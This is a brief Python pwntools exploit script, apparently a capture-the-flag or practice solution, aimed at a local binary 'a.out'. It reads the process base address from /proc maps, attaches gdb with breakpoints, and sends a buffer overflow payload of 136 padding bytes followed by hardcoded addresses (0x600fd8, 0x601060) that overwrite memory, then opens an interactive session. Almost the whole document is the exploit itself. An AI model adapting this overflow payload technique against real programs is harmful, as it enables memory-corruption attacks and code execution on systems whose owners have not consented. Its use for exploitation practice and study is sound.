from pwn import *

p = process('a.out')

def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].decode().split('-')[0], 16)

PIE = get_base_address(p)
print(hex(PIE))
script = ''
script += 'b * main + 47\n'
script += 'b * fclose\n'
gdb.attach(p, gdbscript=script)

padd = b'A' * 136

payload = b''
payload += padd
payload += p64(0x600fd8)
payload += b'A' * (0x100 - 0x90)
payload += p64(0x601060)  
p.sendline(payload)
p.interactive()